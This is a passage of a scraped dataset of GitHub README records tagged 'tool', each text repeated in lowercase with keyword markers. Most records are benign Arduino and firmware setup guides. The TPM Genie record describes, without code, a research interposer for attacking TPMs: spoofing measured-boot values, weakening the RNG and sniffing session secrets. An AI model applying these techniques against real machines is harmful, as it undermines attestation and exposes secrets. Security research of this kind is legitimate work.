Marlin panel displays information about your selected motherboard and basic machine parameters. Each board comes with one or more build environments that are used to generate the final Marlin binary. Choose the environment that best matches your MCU, bootloader, etc.", "link": "https://github.com/MarlinFirmware/AutoBuildMarlin", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "auto build marlin\n\"auto build marlin\" provides a one-button interface to build and upload marlin firmware to your selected motherboard, removing the need to edit your platformio.ini file or scroll through a long list of marlin environments.\nget platformio\nwhen installing \"auto build marlin\" you'll also be prompted to install the platformio extension. this is required for \"auto build marlin\" to function.\nusage\nopen up the downloaded marlin firmware project folder (not the \"marlin\" folder within) in visual studio code. (you may also use the import project\u2026 option from the \"plaformio home\" page.)\nwith marlin open, the \"file explorer\" should be firmly rooted in your marlin firmware folder:\nclick the auto build marlin icon in the activities bar (on the left side of visual studio code window) to bring up the auto build marlin options bar.\nclick any of the -----> tool !!!  icons to open the auto build panel. if there's only one target environment for your board the selected action will be started. otherwise you will have to specify the environment.\nicon action\nstart marlin build to test your marlin build\nstart marlin upload to install marlin on your board\nstart marlin upload (traceback) to install marlin with debugging\nstart marlin clean to delete old build files\nopen the configuration tool\nthe auto build marlin panel displays information about your selected motherboard and basic machine parameters. each board comes with one or more build environments that are used to generate the final marlin binary. choose the environment that best matches your mcu, bootloader, etc.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000258, "year": null}, {"Unnamed: 0": 2301, "autor": 261, "date": null, "content": "LCDGFX library for display controllers\nIntroduction\nDocumentation\nEasy to use\nKey Features\nSetting up\nSupported displays\nSupported platforms\nUseful tools\nProjects using lcdgfx\nThe goals of lcdgfx library\nLicense\nIntroduction\nlcdgfx driver is C++ library with unicode support. The library can be compiled for plain Linux (for example, raspberry spi), or you can use it with plain avr-gcc compiler without Arduino IDE. It supports monochrome and RGB oleds and has debug mode, allowing to execute code on Linux, Windows and macOS, using SDL2.0. The library is intended to run on small microcontrollers. It is developed to use as few resources as possible, but still has powerful capabilities (NanoEngine), allowing to develop nice animation. It works also on any powerful devices like raspberry pi, esp32; and can be easily ported to new platform. This library integrates another library canvas\nDocumentation\nFor more information about this library, please, visit https://github.com/lexus2k/lcdgfx. Documentation generated by doxygen tool can be found at codedocs xyz site. The library provides numerous usage examples.\nEasy to use\nExample:\nDisplayST7735_128x160x16_SPI display(3,{-1, 4, 5, 0,-1,-1});\nvoid setup()\n{\ndisplay.begin();\ndisplay.clear();\n}\nvoid loop()\n{\ndisplay.setColor(RGB_COLOR16(255,255,0));\ndisplay.drawLine(10,30,56,96);\n}\nKey Features\nSupports color, monochrome OLED displays\nThe library has modular structure, and some modules can be excluded from compilation at all to reduce flash usage.\nVery small footprint ( Draw text example uses only 5KiB of Flash with I2C code, display code, font!!! and application itself. Examples without fonts start at 2.5KiB of Flash )\nVery small RAM consumption ( Attiny85 with Damellis package needs minimum 30 bytes of RAM to communicate with OLED )\nFast implementation to provide reasonable speed on slow microcontrollers\nSupports i2c and spi interfaces, allows to implement custom interfaces:\ni2c (software implementation, Wire library, AVR Twi, Linux i2c-dev)\nspi (4-wire spi via Arduino SPI library, AVR Spi, AVR USI module)\nPrimitive graphics functions (lines, rectangles, pixels, bitmaps, drawing canvas)\nPrinting text to display (using fonts of different size, How to add new fonts)\nIncludes graphics engine to support double buffering on tiny microcontrollers.\nCan be used for game development (bonus examples):\nArkanoid game (arkanoid in old style API and arkanoid8 in new style API)\nSimple Lode runner game.\nSnowflakes\nThe i2c pins can be changed via API functions. Please, refer to documentation. Keep in mind, that the pins, which are allowed for i2c or spi interface, depend on the hardware. The default spi SCLK and MOSI pins are defined by SPI library, and DC, RST, CES pins are configurable through API.\nSetting up\ni2c Hardware setup is described here\nSetting up for Arduino from github sources)\nDownload source from https://github.com/lexus2k/lcdgfx\nPut the sources to Arduino/libraries/lcdgfx folder\nSetting up for Arduino from Arduino IDE library manager\nInstall lcdgfx library (named lcdgfx by Alexey Dynda) via Arduino IDE library manager\nUsing with plain avr-gcc:\nDownload source from https://github.com/lexus2k/lcdgfx\nBuild the library (variant 1)\ncd lcdgfx/src && make -f Makefile.avr MCU=<your_mcu>\nLink library to your project (refer to Makefile.avr in examples folder).\nBuild demo code (variant 2)\ncd lcdgfx/tools && ./build_and_run.sh -p avr -m <your_mcu> ssd1306_demo\nFor esp32:\nDownload source from https://github.com/lexus2k/lcdgfx\nPut downloaded sources to components/lcdgfx/ folder.\nCompile your project as described in ESP-IDF build system documentation\nFor more information about this library, please, visit https://github.com/lexus2k/lcdgfx. Doxygen documentation can be found at Codedocs xyz site. If you found any problem or have any idea, please, report to Issues section.\nSupported displays:\nDisplay I2C SPI Orientation Comments\nsh1106 128x64 X X\nsh1107 128x64 X X\nsh1107 64x128 X X\nssd1306 64x32, 64x48, 128x64, 128x32 X X\nssd1325 128x64 X X\nssd1327 128x128 X X\nssd1331 96x64 X X\nssd1351 128x128 X X\nil9163 128x128 X X please, don't forget to connect backlight\nst7735 128x160, 80x160, 128x128 X X please, don't forget to connect backlight\nili9341 240x320 X X please, don't forget to connect backlight\npcd8544 84x48 X Nokia 5110\nany other custom Refer to custom display example\nSupported platforms\nCompilers: gcc, clang\nPlatforms I2C SPI Comments\nArduino\nWio Terminal X X by SeeedStudio\nAttiny85, Attiny45 X X Refer to Damellis attiny package\nAttiny84, Attiny44 X X Refer to Damellis attiny package\nAtmega328p, Atmega168 X X\nAtmega32u4 X X\nAtmega2560 X X\nDigispark, including PRO version X X check examples compatibility list\nESP8266 X X check examples compatibility list\nESP32 X X check examples compatibility list\nSTM32 X X stm32duino\nArduino Zero X X\nNordic nRF5 (nRF51, nRF52) X X via Standard Arduino nRF52 boards. nRF users, enable c++11 in platform.txt -std=gnu++11\nNordic nRF5 (nRF51, nRF52) X X via Sandeep Mistry arduino-nRF5 package\nWio Terminal X X Wio Terminal\nPlain AVR\nAttiny85, Attiny45 X X\nAtmega328p, Atmega168 X X\nAtmega32u4 X X\nPlain ESP32\nESP32 X X library can be used as IDF component\nPlain ESP8266\nESP8266 X X library can be used as IDF RTOS component\nLinux\nRaspberry Pi X X i2c-dev, spidev, sys/class/gpio\nSDL Emulation X X demo code can be run without real OLED HW via SDL library\nmacOS\nSDL Emulation X X demo code can be run without real OLED HW via SDL library\nWindows\nSDL Emulation X X demo code can be run without real OLED HW via MinGW32 + SDL library\nDigispark users, please check compilation options in your Arduino prior to using this library. lcdgfx library requires at least c++11 and c99 (by default Digispark package misses the options -std=gnu11, -std=gnu++11).\nUseful tools\nTim's Image Pixel Editor This is a little application made by Tim Jackson to edit and create Images and fonts for the small monochrome displays.\nBuilt-in font generator Lcdgfx library has built-in Python script to generate lcd fonts from ttf files.\nProjects using lcdgfx\nGUIslice - nice platform independent GUI library for embedded systems\nTension Meter\nESP32-CAM with Capacitive Touch Buttons and OLED\nnice TinyTrackGPS by Rafael Reyes\nThe goals of lcdgfx library\nTo use as few RAM as possible\nTo use as few Flash as possible\nTo be as fast as possible\nTo fit Arkanoid game example to Attiny85 microcontroller\nLicense\nThe library is free. If this project helps you, you can give me a cup of coffee.\nMIT License\nCopyright (c) 2016-2021, Alexey Dynda\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "link": "https://github.com/lexus2k/lcdgfx", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "lcdgfx library for display controllers\nintroduction\ndocumentation\neasy to use\nkey features\nsetting up\nsupported displays\nsupported platforms\nuseful tools\nprojects using lcdgfx\nthe goals of lcdgfx library\nlicense\nintroduction\nlcdgfx driver is c++ library with unicode support. the library can be compiled for plain linux (for example, raspberry spi), or you can use it with plain avr-gcc compiler without arduino ide. it supports monochrome and rgb oleds and has debug mode, allowing to execute code on linux, windows and macos, using sdl2.0. the library is intended to run on small microcontrollers. it is developed to use as few resources as possible, but still has powerful capabilities (nanoengine), allowing to develop nice animation. it works also on any powerful devices like raspberry pi, esp32; and can be easily ported to new platform. this library integrates another library canvas\ndocumentation\nfor more information about this library, please, visit https://github.com/lexus2k/lcdgfx. documentation generated by doxygen -----> tool !!!  can be found at codedocs xyz site. the library provides numerous usage examples.\neasy to use\nexample:\ndisplayst7735_128x160x16_spi display(3,{-1, 4, 5, 0,-1,-1});\nvoid setup()\n{\ndisplay.begin();\ndisplay.clear();\n}\nvoid loop()\n{\ndisplay.setcolor(rgb_color16(255,255,0));\ndisplay.drawline(10,30,56,96);\n}\nkey features\nsupports color, monochrome oled displays\nthe library has modular structure, and some modules can be excluded from compilation at all to reduce flash usage.\nvery small footprint ( draw text example uses only 5kib of flash with i2c code, display code, font!!! and application itself. examples without fonts start at 2.5kib of flash )\nvery small ram consumption ( attiny85 with damellis package needs minimum 30 bytes of ram to communicate with oled )\nfast implementation to provide reasonable speed on slow microcontrollers\nsupports i2c and spi interfaces, allows to implement custom interfaces:\ni2c (software implementation, wire library, avr twi, linux i2c-dev)\nspi (4-wire spi via arduino spi library, avr spi, avr usi module)\nprimitive graphics functions (lines, rectangles, pixels, bitmaps, drawing canvas)\nprinting text to display (using fonts of different size, how to add new fonts)\nincludes graphics engine to support double buffering on tiny microcontrollers.\ncan be used for game development (bonus examples):\narkanoid game (arkanoid in old style api and arkanoid8 in new style api)\nsimple lode runner game.\nsnowflakes\nthe i2c pins can be changed via api functions. please, refer to documentation. keep in mind, that the pins, which are allowed for i2c or spi interface, depend on the hardware. the default spi sclk and mosi pins are defined by spi library, and dc, rst, ces pins are configurable through api.\nsetting up\ni2c hardware setup is described here\nsetting up for arduino from github sources)\ndownload source from https://github.com/lexus2k/lcdgfx\nput the sources to arduino/libraries/lcdgfx folder\nsetting up for arduino from arduino ide library manager\ninstall lcdgfx library (named lcdgfx by alexey dynda) via arduino ide library manager\nusing with plain avr-gcc:\ndownload source from https://github.com/lexus2k/lcdgfx\nbuild the library (variant 1)\ncd lcdgfx/src && make -f makefile.avr mcu=<your_mcu>\nlink library to your project (refer to makefile.avr in examples folder).\nbuild demo code (variant 2)\ncd lcdgfx/tools && ./build_and_run.sh -p avr -m <your_mcu> ssd1306_demo\nfor esp32:\ndownload source from https://github.com/lexus2k/lcdgfx\nput downloaded sources to components/lcdgfx/ folder.\ncompile your project as described in esp-idf build system documentation\nfor more information about this library, please, visit https://github.com/lexus2k/lcdgfx. doxygen documentation can be found at codedocs xyz site. if you found any problem or have any idea, please, report to issues section.\nsupported displays:\ndisplay i2c spi orientation comments\nsh1106 128x64 x x\nsh1107 128x64 x x\nsh1107 64x128 x x\nssd1306 64x32, 64x48, 128x64, 128x32 x x\nssd1325 128x64 x x\nssd1327 128x128 x x\nssd1331 96x64 x x\nssd1351 128x128 x x\nil9163 128x128 x x please, don't forget to connect backlight\nst7735 128x160, 80x160, 128x128 x x please, don't forget to connect backlight\nili9341 240x320 x x please, don't forget to connect backlight\npcd8544 84x48 x nokia 5110\nany other custom refer to custom display example\nsupported platforms\ncompilers: gcc, clang\nplatforms i2c spi comments\narduino\nwio terminal x x by seeedstudio\nattiny85, attiny45 x x refer to damellis attiny package\nattiny84, attiny44 x x refer to damellis attiny package\natmega328p, atmega168 x x\natmega32u4 x x\natmega2560 x x\ndigispark, including pro version x x check examples compatibility list\nesp8266 x x check examples compatibility list\nesp32 x x check examples compatibility list\nstm32 x x stm32duino\narduino zero x x\nnordic nrf5 (nrf51, nrf52) x x via standard arduino nrf52 boards. nrf users, enable c++11 in platform.txt -std=gnu++11\nnordic nrf5 (nrf51, nrf52) x x via sandeep mistry arduino-nrf5 package\nwio terminal x x wio terminal\nplain avr\nattiny85, attiny45 x x\natmega328p, atmega168 x x\natmega32u4 x x\nplain esp32\nesp32 x x library can be used as idf component\nplain esp8266\nesp8266 x x library can be used as idf rtos component\nlinux\nraspberry pi x x i2c-dev, spidev, sys/class/gpio\nsdl emulation x x demo code can be run without real oled hw via sdl library\nmacos\nsdl emulation x x demo code can be run without real oled hw via sdl library\nwindows\nsdl emulation x x demo code can be run without real oled hw via mingw32 + sdl library\ndigispark users, please check compilation options in your arduino prior to using this library. lcdgfx library requires at least c++11 and c99 (by default digispark package misses the options -std=gnu11, -std=gnu++11).\nuseful tools\ntim's image pixel editor this is a little application made by tim jackson to edit and create images and fonts for the small monochrome displays.\nbuilt-in font generator lcdgfx library has built-in python script to generate lcd fonts from ttf files.\nprojects using lcdgfx\nguislice - nice platform independent gui library for embedded systems\ntension meter\nesp32-cam with capacitive touch buttons and oled\nnice tinytrackgps by rafael reyes\nthe goals of lcdgfx library\nto use as few ram as possible\nto use as few flash as possible\nto be as fast as possible\nto fit arkanoid game example to attiny85 microcontroller\nlicense\nthe library is free. if this project helps you, you can give me a cup of coffee.\nmit license\ncopyright (c) 2016-2021, alexey dynda\npermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"software\"), to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:\nthe above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000261, "year": null}, {"Unnamed: 0": 2315, "autor": 275, "date": null, "content": "TPM Genie\nTPM Genie is designed to aid in vulnerability research of Trusted Platform Modules. As a serial bus interposer, TPM Genie is capable of intercepting and modifying all traffic that is sent across the I2C channel between the host machine and a discrete TPM chip.\nOutside of research, the threat model demonstrated by TPM Genie would require an attacker to have temporary physical access to the affected machine in order to implant the interposer device. Such an attack could be conducted in an \"Evil Maid\" scenario, by a rogue employee in a datacenter containing TPM enabled enterprise servers, or by a supply chain interdiction attack in the style of those found in the NSA ANT catalog of hardware implants.\nMany discrete TPMs are broken out to a daughter card that is connected to the main board via a simple header or socket. Consequently, the process of implanting an interposer is fairly straight forward as it would not require the attacker to perform any circuit modification attacks. The implant could be installed in only a few seconds.\nTPM Genie was tested extensively with the Infineon SLB9645 I2C TPM, which conforms to the TPM v1.2 protocol specification.\nKey Features\nThis tool was primarily developed to manipulate TPM response packets in order to trigger parsing bugs in the host-side TPM drivers. These bugs can be found in the Linux kernel, as well as a variety of bootloaders such as Tboot and Tianocore EDKII. Leveraging these vulnerabilities, an attacker may be able to compromise a host machine after it had successfully booted up into a fully measured and attested state.\nTPM Genie is also able to man-in-the-middle PCR Extend operations, yielding the ability to undermine most of the stated purposes of a TPM: measured boot, remote attestation, and sealed storage. Normally, attestation or unsealing should fail if an attacker modifies any component of the measured boot process. However, the interposer makes it is possible to spoof these measurements by replacing the the payload associated with the PCR Extend ordinal as it is transmitted across the bus.\nAdditionally, TPM Genie can weaken the Linux hardware random number generator. On some systems, /dev/hwrng is tied into the Trusted Platform Module such that all reads on the character device will actually result in the TPM chip providing the random bytes. In this way, the interposer can subtly alter the platform's RNG which may impair cryptographic operations on the host.\nFinally, TPM Genie can be used to simply sniff the bus to capture secrets, such as session data associated with the OIAP and OSAP commands. And with nominal additional engineering effort, TPM Genie should be able to spoof the Endorsement Key, gain control of the AuthData and recalculate the Authorization Session HMAC. (More info on that in my whitepaper. I promise I'll implement that soon).\nFurther Information\nTPM Genie Whitepaper\nCanSecWest Slides\nHow to build TPM Genie\nHow to use TPM Genie\nTPM serial bus attack demonstrations", "link": "https://github.com/nccgroup/TPMGenie", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tpm genie\ntpm genie is designed to aid in vulnerability research of trusted platform modules. as a serial bus interposer, tpm genie is capable of intercepting and modifying all traffic that is sent across the i2c channel between the host machine and a discrete tpm chip.\noutside of research, the threat model demonstrated by tpm genie would require an attacker to have temporary physical access to the affected machine in order to implant the interposer device. such an attack could be conducted in an \"evil maid\" scenario, by a rogue employee in a datacenter containing tpm enabled enterprise servers, or by a supply chain interdiction attack in the style of those found in the nsa ant catalog of hardware implants.\nmany discrete tpms are broken out to a daughter card that is connected to the main board via a simple header or socket. consequently, the process of implanting an interposer is fairly straight forward as it would not require the attacker to perform any circuit modification attacks. the implant could be installed in only a few seconds.\ntpm genie was tested extensively with the infineon slb9645 i2c tpm, which conforms to the tpm v1.2 protocol specification.\nkey features\nthis -----> tool !!!  was primarily developed to manipulate tpm response packets in order to trigger parsing bugs in the host-side tpm drivers. these bugs can be found in the linux kernel, as well as a variety of bootloaders such as tboot and tianocore edkii. leveraging these vulnerabilities, an attacker may be able to compromise a host machine after it had successfully booted up into a fully measured and attested state.\ntpm genie is also able to man-in-the-middle pcr extend operations, yielding the ability to undermine most of the stated purposes of a tpm: measured boot, remote attestation, and sealed storage. normally, attestation or unsealing should fail if an attacker modifies any component of the measured boot process. however, the interposer makes it is possible to spoof these measurements by replacing the the payload associated with the pcr extend ordinal as it is transmitted across the bus.\nadditionally, tpm genie can weaken the linux hardware random number generator. on some systems, /dev/hwrng is tied into the trusted platform module such that all reads on the character device will actually result in the tpm chip providing the random bytes. in this way, the interposer can subtly alter the platform's rng which may impair cryptographic operations on the host.\nfinally, tpm genie can be used to simply sniff the bus to capture secrets, such as session data associated with the oiap and osap commands. and with nominal additional engineering effort, tpm genie should be able to spoof the endorsement key, gain control of the authdata and recalculate the authorization session hmac. (more info on that in my whitepaper. i promise i'll implement that soon).\nfurther information\ntpm genie whitepaper\ncansecwest slides\nhow to build tpm genie\nhow to use tpm genie\ntpm serial bus attack demonstrations", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000275, "year": null}, {"Unnamed: 0": 2323, "autor": 283, "date": null, "content": "E-ink-esp32-arduino-weather-time-note\nYou can get time\\weather\\temperature-inside\\humility-inside\\pressure-inside\\IAQ-inside\\QQ-note\\computer-info on this device.\nVideo Introduction\nENGLISH:\n\u652f\u6301TTGO T5 V2.2 \u548c TTGO T5 V2.3\u4e24\u4e2a\u578b\u53f7\u7684\u5f00\u53d1\u677f\uff0c\u5176\u4ed6\u578b\u53f7\u672a\u9002\u914d\u3002\nBEFORE\uff1a\n1.prepare the online weather API\uff08https://dev.heweather.com/ \uff09\nSERVER\uff1a\n1.prepare a vps, suck as Windows server.\n2.config MQTT server on your vps.\n3.install CQTIMPORTANT! CQT is not working any more. please use HTTP API.\n4.install CQhttp plugin\uff08https://cqp.cc/t/30748 \uff09\n5.modify .py. add your QQ number in the right place.\n6.install python requirements.\nArduino\uff1a\n1.install Arduino IDE.\n2.install esp32-arduino board for Arduino IDE\uff08https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json \uff09\n3.install Arduino library\nButton2\nGxEPD\nAdafruit-GFX-Library\nAsyncTCP\nESPAsyncWebServer\nArduinoJson\nESP8266Audio\nU8g2_for_Adafruit_GFX\nPubSubClient\nAdafruit_Sensor\nAdafruit_BME680\n4.install Arduino tool for esp32\uff08Use Arduino ESP32 Sketch data Upload files,if you not install,download ESP32FS-vX.zip,Extract to <C:\\Users\\Your User Name\\Documents\\Arduino\\tools>,Open Ardunio IDE, Tools -> ESP32 Sketch data Upload -> Upload\uff09\n5.use ESP32 Sketch data Upload files.\n6.upload your sketch to esp32\uff08Compilation speed is very slow, on my laptop, i need 2min 55sec.\uff09\nvideo introduction(https://www.bilibili.com/video/BV1pt4y1y7ya)\nCHINESE:\n\u652f\u6301TTGO T5 V2.2 \u548c TTGO T5 V2.3\u4e24\u4e2a\u578b\u53f7\u7684\u5f00\u53d1\u677f\uff0c\u5176\u4ed6\u578b\u53f7\u672a\u9002\u914d\u3002\n\u524d\u671f\u51c6\u5907\uff1a\n1.\u51c6\u5907\u548c\u98ce\u5929\u6c14api\u63a5\u53e3\uff08https://dev.heweather.com/ \uff09\n\u670d\u52a1\u5668\uff1a\n1.\u51c6\u5907\u670d\u52a1\u5668\uff0cLinux Centos7\u670d\u52a1\u5668\u3002\u5176\u4ed6\u7cfb\u7edf\u5927\u540c\u5c0f\u5f02\uff0c\u53ef\u81ea\u884c\u7814\u7a76\u3002\n2.\u5728Linux\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u597dMQTT\u670d\u52a1\u7aef\uff0c\u53ef\u53c2\u7167EMQ\u5b98\u65b9\u7f51\u7ad9\u3002\u6709docker\u4f7f\u7528\u7ecf\u9a8c\u7684\u5f00\u53d1\u4eba\u5458\u63a8\u8350\u4f7f\u7528docker\u8fdb\u884c\u90e8\u7f72\uff0c\u66f4\u65b9\u4fbf\u7ba1\u7406\u3002\n3.\u5b89\u88c5OPQBot\u3002\n4.\u4e3aServer\u7684Python\u811a\u672c\u5b89\u88c5\u4f9d\u8d56\u5305\u3002Python\u7248\u672c3.6.8\u3002\u53ef\u901a\u8fc7requirements\u5b89\u88c5\u3002\n5.\u66f4\u6539config.py\u4e2d\u76f8\u5173\u7684\u5185\u5bb9\u3002\n6.\u4fee\u6539Eink.service\u4e2d\u7684\u201c/root/Eink/Eink.py\"\u7684\u5b9e\u9645\u8def\u5f84\u3002\n7.\u5c06Eink.service\u653e\u5165\"/usr/lib/systemd/system/\"\n8.\u8f93\u5165'sudo systemctl start Eink.service'\u4ee5\u542f\u52a8\u7a0b\u5e8f\uff0c\u4e4b\u540e\u8f93\u5165'sudo systemctl enable Eink.service'\u542f\u7528\u5f00\u673a\u81ea\u52a8\u542f\u52a8\u3002\nArduino\uff1a\n1.\u5b89\u88c5arduino\n2.\u5b89\u88c5esp32\u5f00\u53d1\u677f\uff08https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json \uff09\n3.\u5b89\u88c5arduino\u5e93\nButton2\nGxEPD\nAdafruit-GFX-Library\nAsyncTCP\nESPAsyncWebServer\nArduinoJson\nESP8266Audio\nU8g2_for_Adafruit_GFX\nPubSubClient\nAdafruit_Sensor\nAdafruit_BME680\n4.\u5728Arduino\u5de5\u5177\u7684Partition Scheme\u4e2d\u9009\u62e9Huge App.\n5.\u66f4\u6539config.h\u4e2d\u76f8\u5173\u7684\u5185\u5bb9\u3002\n6.\u4e0a\u4f20\u7a0b\u5e8f\uff08\u7f16\u8bd1\u8f83\u6162\uff0c\u6211\u7684\u7535\u8111\u4e0d\u4f7f\u7528\u9884\u7f16\u8bd1\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u9700\u89812\u520655\u79d2\u7f16\u8bd1\u4e00\u6b21\u3002\u8bf7\u5728issue\u4e2d\u7559\u4e0b\u4f60\u9700\u8981\u591a\u957f\u65f6\u95f4\uff09\n\u89c6\u9891\u4ecb\u7ecd", "link": "https://github.com/Eddddddddy/E-ink-esp32-arduino-weather-time-note", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "e-ink-esp32-arduino-weather-time-note\nyou can get time\\weather\\temperature-inside\\humility-inside\\pressure-inside\\iaq-inside\\qq-note\\computer-info on this device.\nvideo introduction\nenglish:\n\u652f\u6301ttgo t5 v2.2 \u548c ttgo t5 v2.3\u4e24\u4e2a\u578b\u53f7\u7684\u5f00\u53d1\u677f\uff0c\u5176\u4ed6\u578b\u53f7\u672a\u9002\u914d\u3002\nbefore\uff1a\n1.prepare the online weather api\uff08https://dev.heweather.com/ \uff09\nserver\uff1a\n1.prepare a vps, suck as windows server.\n2.config mqtt server on your vps.\n3.install cqtimportant! cqt is not working any more. please use http api.\n4.install cqhttp plugin\uff08https://cqp.cc/t/30748 \uff09\n5.modify .py. add your qq number in the right place.\n6.install python requirements.\narduino\uff1a\n1.install arduino ide.\n2.install esp32-arduino board for arduino ide\uff08https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json \uff09\n3.install arduino library\nbutton2\ngxepd\nadafruit-gfx-library\nasynctcp\nespasyncwebserver\narduinojson\nesp8266audio\nu8g2_for_adafruit_gfx\npubsubclient\nadafruit_sensor\nadafruit_bme680\n4.install arduino -----> tool !!!  for esp32\uff08use arduino esp32 sketch data upload files,if you not install,download esp32fs-vx.zip,extract to <c:\\users\\your user name\\documents\\arduino\\tools>,open ardunio ide, tools -> esp32 sketch data upload -> upload\uff09\n5.use esp32 sketch data upload files.\n6.upload your sketch to esp32\uff08compilation speed is very slow, on my laptop, i need 2min 55sec.\uff09\nvideo introduction(https://www.bilibili.com/video/bv1pt4y1y7ya)\nchinese:\n\u652f\u6301ttgo t5 v2.2 \u548c ttgo t5 v2.3\u4e24\u4e2a\u578b\u53f7\u7684\u5f00\u53d1\u677f\uff0c\u5176\u4ed6\u578b\u53f7\u672a\u9002\u914d\u3002\n\u524d\u671f\u51c6\u5907\uff1a\n1.\u51c6\u5907\u548c\u98ce\u5929\u6c14api\u63a5\u53e3\uff08https://dev.heweather.com/ \uff09\n\u670d\u52a1\u5668\uff1a\n1.\u51c6\u5907\u670d\u52a1\u5668\uff0clinux centos7\u670d\u52a1\u5668\u3002\u5176\u4ed6\u7cfb\u7edf\u5927\u540c\u5c0f\u5f02\uff0c\u53ef\u81ea\u884c\u7814\u7a76\u3002\n2.\u5728linux\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u597dmqtt\u670d\u52a1\u7aef\uff0c\u53ef\u53c2\u7167emq\u5b98\u65b9\u7f51\u7ad9\u3002\u6709docker\u4f7f\u7528\u7ecf\u9a8c\u7684\u5f00\u53d1\u4eba\u5458\u63a8\u8350\u4f7f\u7528docker\u8fdb\u884c\u90e8\u7f72\uff0c\u66f4\u65b9\u4fbf\u7ba1\u7406\u3002\n3.\u5b89\u88c5opqbot\u3002\n4.\u4e3aserver\u7684python\u811a\u672c\u5b89\u88c5\u4f9d\u8d56\u5305\u3002python\u7248\u672c3.6.8\u3002\u53ef\u901a\u8fc7requirements\u5b89\u88c5\u3002\n5.\u66f4\u6539config.py\u4e2d\u76f8\u5173\u7684\u5185\u5bb9\u3002\n6.\u4fee\u6539eink.service\u4e2d\u7684\u201c/root/eink/eink.py\"\u7684\u5b9e\u9645\u8def\u5f84\u3002\n7.\u5c06eink.service\u653e\u5165\"/usr/lib/systemd/system/\"\n8.\u8f93\u5165'sudo systemctl start eink.service'\u4ee5\u542f\u52a8\u7a0b\u5e8f\uff0c\u4e4b\u540e\u8f93\u5165'sudo systemctl enable eink.service'\u542f\u7528\u5f00\u673a\u81ea\u52a8\u542f\u52a8\u3002\narduino\uff1a\n1.\u5b89\u88c5arduino\n2.\u5b89\u88c5esp32\u5f00\u53d1\u677f\uff08https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json \uff09\n3.\u5b89\u88c5arduino\u5e93\nbutton2\ngxepd\nadafruit-gfx-library\nasynctcp\nespasyncwebserver\narduinojson\nesp8266audio\nu8g2_for_adafruit_gfx\npubsubclient\nadafruit_sensor\nadafruit_bme680\n4.\u5728arduino\u5de5\u5177\u7684partition scheme\u4e2d\u9009\u62e9huge app.\n5.\u66f4\u6539config.h\u4e2d\u76f8\u5173\u7684\u5185\u5bb9\u3002\n6.\u4e0a\u4f20\u7a0b\u5e8f\uff08\u7f16\u8bd1\u8f83\u6162\uff0c\u6211\u7684\u7535\u8111\u4e0d\u4f7f\u7528\u9884\u7f16\u8bd1\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u9700\u89812\u520655\u79d2\u7f16\u8bd1\u4e00\u6b21\u3002\u8bf7\u5728issue\u4e2d\u7559\u4e0b\u4f60\u9700\u8981\u591a\u957f\u65f6\u95f4\uff09\n\u89c6\u9891\u4ecb\u7ecd", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000283, "year": null}, {"Unnamed: 0": 2324, "autor": 284, "date": null, "content": "Arduino KiCad Library\nVersion 1.4.1\nLibrary of schematic components and footprints of common Arduino boards for KiCad.\nCurrently included are:\nArduino 101 Shield\nArduino Due Shield\nArduino Leonardo Shied\nArduino M0 Shield\nArduino M0 Pro Shield\nArduino Mega 2560 Shield\nArduino Micro Socket\nArduino Mini Socket\nArduino Nano Socket\nArduino Uno Shield\nArduino Zero Shield\nShield means the Arduino is designed to plug in from beneath your PCB; socket means it is designed to plug in from above.\nComments, Requests, Bugs & Contributions\nAll are welcome.\nPlease file an Issue or Pull Request at https://github.com/Alarm-Siren/arduino-kicad-library\nLicense\nCopyright 2017-2018, Nicholas Parks Young. All Rights Reserved.\nThis library is licensed under the GNU LGPL v2.1, which can be found in file LICENSE.txt.\nDonations\nIf you've found this library useful and you'd like to make a donation towards its continued upkeep, click the button below:\nLibrary Setup\nTo add this library to your KiCad Project, do the following steps:\nCopy the source files to your Project. Make sure that the Arduino.pretty folder structure is preserved.\nIn 